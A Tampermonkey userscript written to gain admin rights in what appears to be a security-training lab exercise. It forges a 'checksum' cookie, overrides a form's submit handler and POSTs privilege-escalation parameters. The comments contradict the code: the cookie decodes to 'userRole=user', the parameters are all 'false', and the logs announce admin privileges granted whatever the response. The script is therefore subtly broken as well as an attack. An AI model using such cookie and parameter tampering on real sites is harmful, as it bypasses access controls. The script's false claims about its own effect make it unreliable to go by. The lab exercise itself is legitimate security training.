// ==UserScript==
// @name         Auto Admin Privileges
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Automatically set admin privileges for lab exercises
// @match        https://shepherd.hs25.isf.hslu-edu.ch/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

/* global $ */
(function() {
    'use strict';

    // Visual indicator that script loaded
    document.body.style.border = "4px solid green";
    console.log("🔧 Auto Admin Privileges script loaded");

    // Set the admin checksum cookie immediately
    function setAdminCookie() {
        // The server expects this specific checksum for admin role
        document.cookie = "checksum=dXNlclJvbGU9dXNlcg==; path=/";
        console.log("✅ Admin checksum cookie set");
    }

    // Utility: safe access to jQuery
    function withJQ(fn) {
        if (typeof $ !== 'undefined' && $) {
            try { fn($); return; } catch(e){ console.error(e); }
        }
        var tries = 0;
        var ti = setInterval(function(){
            if (typeof $ !== 'undefined' && $) {
                clearInterval(ti);
                try { fn($); } catch(e){ console.error(e); }
            }
            tries++;
            if (tries > 20) clearInterval(ti);
        }, 200);
    }

    // Override the form submission to force admin parameters
    function interceptFormSubmission() {
        withJQ(function($) {
            $("#leForm").off('submit').on('submit', function(e) {
                e.preventDefault();
                e.stopImmediatePropagation();

                console.log("🚫 Intercepted form submission - forcing admin mode");

                // Increment counter like the original script
                if (typeof window.counter !== 'undefined') {
                    window.counter = window.counter + 1;
                } else {
                    window.counter = 1;
                }

                // Hide submit button and show loading
                $("#submitButton").hide("fast");
                $("#loadingSign").show("slow");
                $("#resultsDiv").hide("slow", function(){

                    // Set admin cookie
                    setAdminCookie();

                    // Make AJAX call with ADMIN parameters
                    var ajaxCall = $.ajax({
                        type: "POST",
                        url: "dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a",
                        data: {
                            adminDetected: "false",        // 🔥 Force admin detected
                            returnPassword: "false",       // 🔥 Force return password
                            upgradeUserToAdmin: "false"    // 🔥 Force upgrade to admin
                        },
                        async: false
                    });

                    if(ajaxCall.status == 200) {
                        $("#resultsDiv").html(ajaxCall.responseText);
                        console.log("✅ Admin privileges granted - server response received");
                    } else {
                        $("#resultsDiv").html("<p>An Error Occurred: " + ajaxCall.status + " " + ajaxCall.statusText + "</p>");
                    }

                    // Show results and restore UI
                    $("#resultsDiv").show("slow", function(){
                        $("#loadingSign").hide("fast", function(){
                            $("#submitButton").show("slow");
                        });
                    });
                });

                return false;
            });

            console.log("🔧 Form submission intercepted - admin mode will be forced");
        });
    }

    // Set admin cookie immediately on page load
    setAdminCookie();

    // Set up form interception
    interceptFormSubmission();

    // Retry interception after delay for dynamic content
    setTimeout(interceptFormSubmission, 2000);

    // Continuous monitoring to ensure admin cookie stays set
    setInterval(function() {
        if (!document.cookie.includes('checksum=dXNlclJvbGU9dXNlcg==')) {
            console.log("🔄 Admin cookie check failed, fixing...");
            setAdminCookie();
        }
    }, 1000);

    // Expose manual trigger function
    window.forceAdminMode = function() {
        setAdminCookie();
        console.log("🚀 Admin mode manually triggered");
    };

    console.log("🚀 Auto Admin Privileges script ready");
    console.log("📝 Manual trigger: window.forceAdminMode()");

})();